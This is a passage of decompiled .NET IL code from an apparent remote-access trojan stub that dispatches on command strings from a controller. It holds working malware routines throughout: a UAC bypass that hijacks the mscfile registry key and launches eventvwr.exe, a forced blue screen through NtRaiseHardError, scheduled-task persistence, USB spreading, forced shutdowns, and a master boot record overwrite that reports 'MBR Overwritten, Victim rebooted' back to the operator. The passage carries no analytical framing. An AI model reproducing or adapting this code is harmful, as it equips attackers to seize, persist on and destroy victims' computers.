      IL_05ec:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05f1:  brfalse    IL_11d2

      IL_05f6:  br         IL_1b66

      IL_05fb:  ldloc.2
      IL_05fc:  ldstr      "spooky"
      IL_0601:  ldc.i4.0
      IL_0602:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0607:  brfalse    IL_12d9

      IL_060c:  br         IL_1b66

      IL_0611:  ldloc.2
      IL_0612:  ldstr      "gradient"
      IL_0617:  ldc.i4.0
      IL_0618:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_061d:  brfalse    IL_14e7

      IL_0622:  br         IL_1b66

      IL_0627:  ldloc.2
      IL_0628:  ldstr      "newmouse"
      IL_062d:  ldc.i4.0
      IL_062e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0633:  brfalse    IL_1679

      IL_0638:  br         IL_1b66

      IL_063d:  ldloc.2
      IL_063e:  ldstr      "OpenCD"
      IL_0643:  ldc.i4.0
      IL_0644:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0649:  brfalse    IL_1694

      IL_064e:  br         IL_1b66

      IL_0653:  ldloc.2
      IL_0654:  ldstr      "CloseCD"
      IL_0659:  ldc.i4.0
      IL_065a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_065f:  brfalse    IL_16ab

      IL_0664:  br         IL_1b66

      IL_0669:  ldloc.2
      IL_066a:  ldstr      "MonitorON"
      IL_066f:  ldc.i4.0
      IL_0670:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0675:  brfalse    IL_16c2

      IL_067a:  br         IL_1b66

      IL_067f:  ldloc.2
      IL_0680:  ldstr      "MonitorOFF"
      IL_0685:  ldc.i4.0
      IL_0686:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_068b:  brfalse    IL_16d8

      IL_0690:  br         IL_1b66

      IL_0695:  ldloc.2
      IL_0696:  ldstr      "HideTask"
      IL_069b:  ldc.i4.0
      IL_069c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06a1:  brfalse    IL_16ee

      IL_06a6:  br         IL_1b66

      IL_06ab:  ldloc.2
      IL_06ac:  ldstr      "ShowTask"
      IL_06b1:  ldc.i4.0
      IL_06b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06b7:  brfalse    IL_1705

      IL_06bc:  br         IL_1b66

      IL_06c1:  ldloc.2
      IL_06c2:  ldstr      "HideDesk"
      IL_06c7:  ldc.i4.0
      IL_06c8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06cd:  brfalse    IL_171c

      IL_06d2:  br         IL_1b66

      IL_06d7:  ldloc.2
      IL_06d8:  ldstr      "ShowDesk"
      IL_06dd:  ldc.i4.0
      IL_06de:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06e3:  brfalse    IL_1733

      IL_06e8:  br         IL_1b66

      IL_06ed:  ldloc.2
      IL_06ee:  ldstr      "PermisaoFrmTerrror"
      IL_06f3:  ldc.i4.0
      IL_06f4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06f9:  brfalse    IL_174a

      IL_06fe:  br         IL_1b66

      IL_0703:  ldloc.2
      IL_0704:  ldstr      "EnviarImagemTerrorrr"
      IL_0709:  ldc.i4.0
      IL_070a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_070f:  brfalse    IL_175a

      IL_0714:  br         IL_1b66

      IL_0719:  ldloc.2
      IL_071a:  ldstr      "EnviarImagemScreammm"
      IL_071f:  ldc.i4.0
      IL_0720:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0725:  brfalse    IL_17d6

      IL_072a:  br         IL_1b66

      IL_072f:  ldloc.2
      IL_0730:  ldstr      "SoundUp"
      IL_0735:  ldc.i4.0
      IL_0736:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_073b:  brfalse    IL_1852

      IL_0740:  br         IL_1b66

      IL_0745:  ldloc.2
      IL_0746:  ldstr      "Error"
      IL_074b:  ldc.i4.0
      IL_074c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0751:  brfalse    IL_18a6

      IL_0756:  br         IL_1b66

      IL_075b:  ldloc.2
      IL_075c:  ldstr      "Speech"
      IL_0761:  ldc.i4.0
      IL_0762:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0767:  brfalse    IL_1993

      IL_076c:  br         IL_1b66

      IL_0771:  ldloc.2
      IL_0772:  ldstr      "fun"
      IL_0777:  ldc.i4.0
      IL_0778:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_077d:  brfalse    IL_19d6

      IL_0782:  br         IL_1b66

      IL_0787:  ldloc.2
      IL_0788:  ldstr      "Piano"
      IL_078d:  ldc.i4.0
      IL_078e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0793:  brfalse    IL_19e6

      IL_0798:  br         IL_1b66

      IL_079d:  ldloc.2
      IL_079e:  ldstr      "sht"
      IL_07a3:  ldc.i4.0
      IL_07a4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07a9:  brfalse    IL_1a10

      IL_07ae:  br         IL_1b66

      IL_07b3:  ldloc.2
      IL_07b4:  ldstr      "rst"
      IL_07b9:  ldc.i4.0
      IL_07ba:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07bf:  brfalse    IL_1a25

      IL_07c4:  br         IL_1b66

      IL_07c9:  ldloc.2
      IL_07ca:  ldstr      "lof"
      IL_07cf:  ldc.i4.0
      IL_07d0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07d5:  brfalse    IL_1a3a

      IL_07da:  br         IL_1b66

      IL_07df:  ldloc.2
      IL_07e0:  ldstr      "botk"
      IL_07e5:  ldc.i4.0
      IL_07e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07eb:  brfalse    IL_1a4f

      IL_07f0:  br         IL_1b66

      IL_07f5:  ldloc.2
      IL_07f6:  ldstr      "WMM"
      IL_07fb:  ldc.i4.0
      IL_07fc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0801:  brfalse    IL_1a59

      IL_0806:  br         IL_1b66

      IL_080b:  ldloc.2
      IL_080c:  ldstr      "DisWMM"
      IL_0811:  ldc.i4.0
      IL_0812:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0817:  brfalse    IL_1a68

      IL_081c:  br         IL_1b66

      IL_0821:  ldloc.2
      IL_0822:  ldstr      "SCRM"
      IL_0827:  ldc.i4.0
      IL_0828:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_082d:  brfalse    IL_1a77

      IL_0832:  br         IL_1b66

      IL_0837:  ldloc.2
      IL_0838:  ldstr      "NoSCRM"
      IL_083d:  ldc.i4.0
      IL_083e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0843:  brfalse    IL_1a86

      IL_0848:  br         IL_1b66

      IL_084d:  ldloc.2
      IL_084e:  ldstr      "ll"
      IL_0853:  ldc.i4.0
      IL_0854:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0859:  brfalse    IL_1a95

      IL_085e:  br         IL_1b66

      IL_0863:  ldloc.2
      IL_0864:  ldstr      "kl"
      IL_0869:  ldc.i4.0
      IL_086a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_086f:  brfalse    IL_1aa0

      IL_0874:  br         IL_1b66

      IL_0879:  ldloc.2
      IL_087a:  ldstr      "prof"
      IL_087f:  ldc.i4.0
      IL_0880:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0885:  brfalse    IL_1ac9

      IL_088a:  br         IL_1b66

      IL_088f:  ldc.i4.s   19
      IL_0891:  ldc.i4.1
      IL_0892:  ldc.i4.0
      IL_0893:  ldloca.s   V_10
      IL_0895:  call       uint32 j.OK::RtlAdjustPrivilege(int32,
                                                           bool,
                                                           bool,
                                                           bool&)
      IL_089a:  pop
      IL_089b:  ldc.i4     0xc0000156
      IL_08a0:  ldc.i4.0
      IL_08a1:  ldc.i4.0
      IL_08a2:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_08a7:  ldc.i4.6
      IL_08a8:  ldloca.s   V_11
      IL_08aa:  call       uint32 j.OK::NtRaiseHardError(uint32,
                                                         uint32,
                                                         uint32,
                                                         native int,
                                                         uint32,
                                                         uint32&)
      IL_08af:  pop
      IL_08b0:  leave      IL_2724

      IL_08b5:  call       void Persistence::Startup()
      IL_08ba:  leave      IL_2724

      IL_08bf:  nop
      .try
      {
        IL_08c0:  ldstr      "%SystemRoot%\\system32\\mmc.exe"
        IL_08c5:  ldstr      " \"%1\" %*"
        IL_08ca:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_08cf:  stloc.s    V_12
        IL_08d1:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_08d6:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
        IL_08db:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_08e0:  ldstr      ""
        IL_08e5:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
        IL_08ea:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
        IL_08ef:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_08f4:  call       string [mscorlib]System.IO.Path::GetFileName(string)
        IL_08f9:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_08fe:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0903:  ldstr      "eventvwr.exe"
        IL_0908:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_090d:  pop
        IL_090e:  ldc.i4     0x1f4
        IL_0913:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0918:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
        IL_091d:  ldstr      "Software\\Classes\\mscfile\\shell\\open\\command"
        IL_0922:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
        IL_0927:  ldstr      ""
        IL_092c:  ldloc.s    V_12
        IL_092e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0933:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
        IL_0938:  leave.s    IL_0949

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_093a:  dup
        IL_093b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0940:  stloc.s    V_13
        IL_0942:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0947:  leave.s    IL_0949

      }  // end handler
      IL_0949:  leave      IL_2724

      IL_094e:  nop
      .try
      {
        IL_094f:  ldstr      "C://win.dat"
        IL_0954:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0959:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_095e:  ldstr      "MSG"
        IL_0963:  ldsfld     string j.OK::Y
        IL_0968:  ldstr      "Check: You have admin rights."
        IL_096d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0972:  call       bool j.OK::Send(string)
        IL_0977:  pop
        IL_0978:  ldstr      "C://win.dat"
        IL_097d:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0982:  leave      IL_1b66

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0987:  dup
        IL_0988:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_098d:  stloc.s    V_14
        IL_098f:  ldloc.s    V_14
        IL_0991:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_0996:  ldstr      "denied"
        IL_099b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_09a0:  brfalse.s  IL_09bc

        IL_09a2:  ldstr      "MSG"
        IL_09a7:  ldsfld     string j.OK::Y
        IL_09ac:  ldstr      "Check: You have no admin rights."
        IL_09b1:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_09b6:  call       bool j.OK::Send(string)
        IL_09bb:  pop
        IL_09bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09c1:  leave      IL_1b66

      }  // end handler
      IL_09c6:  nop
      .try
      {
        IL_09c7:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
        IL_09cc:  dup
        IL_09cd:  ldc.i4.1
        IL_09ce:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
        IL_09d3:  dup
        IL_09d4:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_09d9:  call       string [mscorlib]System.IO.Path::GetFileName(string)
        IL_09de:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
        IL_09e3:  dup
        IL_09e4:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
        IL_09e9:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
        IL_09ee:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WorkingDirectory(string)
        IL_09f3:  dup
        IL_09f4:  ldstr      "runas"
        IL_09f9:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Verb(string)
        IL_09fe:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
        IL_0a03:  pop
        IL_0a04:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
        IL_0a09:  leave      IL_1b66

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a0e:  dup
        IL_0a0f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a14:  stloc.s    V_15
        IL_0a16:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a1b:  leave      IL_1b66

      }  // end handler
      IL_0a20:  ldc.i4.5
      IL_0a21:  newarr     [mscorlib]System.String
      IL_0a26:  dup
      IL_0a27:  ldc.i4.0
      IL_0a28:  ldstr      "schtasks /create /sc minute /mo 1 /tn "
      IL_0a2d:  stelem.ref
      IL_0a2e:  dup
      IL_0a2f:  ldc.i4.1
      IL_0a30:  ldsfld     string j.OK::SCHEDNAME
      IL_0a35:  stelem.ref
      IL_0a36:  dup
      IL_0a37:  ldc.i4.2
      IL_0a38:  ldstr      " /tr "
      IL_0a3d:  stelem.ref
      IL_0a3e:  dup
      IL_0a3f:  ldc.i4.3
      IL_0a40:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_0a45:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_0a4a:  stelem.ref
      IL_0a4b:  dup
      IL_0a4c:  ldc.i4.4
      IL_0a4d:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0a52:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_0a57:  stelem.ref
      IL_0a58:  call       string [mscorlib]System.String::Concat(string[])
      IL_0a5d:  ldc.i4.0
      IL_0a5e:  ldc.i4.1
      IL_0a5f:  ldc.i4     0x1388
      IL_0a64:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0a69:  pop
      IL_0a6a:  br         IL_1b66

      IL_0a6f:  ldstr      "schtasks /delete /tn "
      IL_0a74:  ldsfld     string j.OK::SCHEDNAME
      IL_0a79:  ldstr      " /f"
      IL_0a7e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a83:  ldc.i4.0
      IL_0a84:  ldc.i4.1
      IL_0a85:  ldc.i4     0x1388
      IL_0a8a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0a8f:  pop
      IL_0a90:  br         IL_1b66

      IL_0a95:  call       void spredusb::Start()
      IL_0a9a:  leave      IL_2724

      IL_0a9f:  ldstr      "shutdown -r -t 00 -f"
      IL_0aa4:  ldc.i4.0
      IL_0aa5:  ldc.i4.0
      IL_0aa6:  ldc.i4.m1
      IL_0aa7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0aac:  pop
      IL_0aad:  leave      IL_2724

      IL_0ab2:  ldstr      "shutdown -s -t 00 -f"
      IL_0ab7:  ldc.i4.0
      IL_0ab8:  ldc.i4.0
      IL_0ab9:  ldc.i4.m1
      IL_0aba:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0abf:  pop
      IL_0ac0:  leave      IL_2724

      IL_0ac5:  nop
      .try
      {
        IL_0ac6:  ldstr      "C://test.txt"
        IL_0acb:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0ad0:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_0ad5:  ldstr      "MSG"
        IL_0ada:  ldsfld     string j.OK::Y
        IL_0adf:  ldstr      "MBR Overwritten, Victim rebooted."
        IL_0ae4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0ae9:  call       bool j.OK::Send(string)
        IL_0aee:  pop
        IL_0aef:  call       void Stub.MBRSlayer::Start()
        IL_0af4:  ldstr      "cmd /c start shutdown /r /f /t 3"
        IL_0af9:  ldc.i4.0
        IL_0afa:  ldc.i4.1
        IL_0afb:  ldc.i4     0x1388
        IL_0b00:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_0b05:  pop
        IL_0b06:  ldstr      "C://test.txt"
        IL_0b0b:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0b10:  leave      IL_1b66

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0b15:  dup
        IL_0b16:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b1b:  stloc.s    V_16
        IL_0b1d:  ldloc.s    V_16
        IL_0b1f:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_0b24:  ldstr      "denied"
        IL_0b29:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0b2e:  brfalse.s  IL_0b4a

        IL_0b30:  ldstr      "MSG"
        IL_0b35:  ldsfld     string j.OK::Y
        IL_0b3a:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_0b3f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0b44:  call       bool j.OK::Send(string)
        IL_0b49:  pop
        IL_0b4a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b4f:  leave      IL_1b66

      }  // end handler
      IL_0b54:  nop
      .try
      {
        IL_0b55:  ldstr      "C://test.txt"
        IL_0b5a:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_0b5f:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_0b64:  ldstr      "MSG"
        IL_0b69:  ldsfld     string j.OK::Y
        IL_0b6e:  ldstr      "MBR Overwritten."
        IL_0b73:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0b78:  call       bool j.OK::Send(string)
        IL_0b7d:  pop
        IL_0b7e:  call       void Stub.MBRSlayer::Start()
        IL_0b83:  ldstr      "C://test.txt"
        IL_0b88:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0b8d:  leave      IL_1b66

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0b92:  dup
        IL_0b93:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b98:  stloc.s    V_17
        IL_0b9a:  ldloc.s    V_17
        IL_0b9c:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_0ba1:  ldstr      "denied"
        IL_0ba6:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0bab:  brfalse.s  IL_0bc7

        IL_0bad:  ldstr      "MSG"
        IL_0bb2:  ldsfld     string j.OK::Y
        IL_0bb7:  ldstr      "Can't overwrite MBR. (No admin)"
        IL_0bbc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0bc1:  call       bool j.OK::Send(string)
        IL_0bc6:  pop
        IL_0bc7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0bcc:  leave      IL_1b66

      }  // end handler
      IL_0bd1:  call       native int j.OK::GetDesktopWindow()
      IL_0bd6:  call       native int j.OK::GetWindowDC(native int)
      IL_0bdb:  stloc.s    V_18
      IL_0bdd:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0be2:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0be7:  stloc.s    V_21
      IL_0be9:  ldloca.s   V_21
      IL_0beb:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0bf0:  stloc.s    V_19
      IL_0bf2:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0bf7:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0bfc:  stloc.s    V_21
      IL_0bfe:  ldloca.s   V_21
      IL_0c00:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0c05:  stloc.s    V_20
      IL_0c07:  ldloc.s    V_18
      IL_0c09:  ldc.i4.0
      IL_0c0a:  ldloc.s    V_20
      IL_0c0c:  ldloc.s    V_19
      IL_0c0e:  ldc.i4.0
      IL_0c0f:  ldloc.s    V_20
      IL_0c11:  sub.ovf
      IL_0c12:  ldloc.s    V_18
      IL_0c14:  ldc.i4.0
      IL_0c15:  ldc.i4.0
      IL_0c16:  ldloc.s    V_19
      IL_0c18:  ldloc.s    V_20
      IL_0c1a:  ldc.i4     0xcc0020
      IL_0c1f:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0c24:  pop
      IL_0c25:  br         IL_1b66

      IL_0c2a:  call       native int j.OK::GetDesktopWindow()
      IL_0c2f:  call       native int j.OK::GetWindowDC(native int)
      IL_0c34:  stloc.s    V_22
      IL_0c36:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0c3b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c40:  stloc.s    V_21
      IL_0c42:  ldloca.s   V_21
      IL_0c44:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0c49:  stloc.s    V_23
      IL_0c4b:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0c50:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c55:  stloc.s    V_21
      IL_0c57:  ldloca.s   V_21
      IL_0c59:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0c5e:  stloc.s    V_24
      IL_0c60:  ldloc.s    V_22
      IL_0c62:  ldloc.s    V_23
      IL_0c64:  ldc.i4.0
      IL_0c65:  ldc.i4.0
      IL_0c66:  ldloc.s    V_23
      IL_0c68:  sub.ovf
      IL_0c69:  ldloc.s    V_24
      IL_0c6b:  ldloc.s    V_22
      IL_0c6d:  ldc.i4.0
      IL_0c6e:  ldc.i4.0
      IL_0c6f:  ldloc.s    V_23
      IL_0c71:  ldloc.s    V_24
      IL_0c73:  ldc.i4     0xcc0020
      IL_0c78:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_0c7d:  pop
      IL_0c7e:  br         IL_1b66

      IL_0c83:  call       native int j.OK::GetDesktopWindow()
      IL_0c88:  call       native int j.OK::GetWindowDC(native int)
      IL_0c8d:  stloc.s    V_25
      IL_0c8f:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0c94:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0c99:  stloc.s    V_21
      IL_0c9b:  ldloca.s   V_21
      IL_0c9d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0ca2:  stloc.s    V_26
      IL_0ca4:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0ca9:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
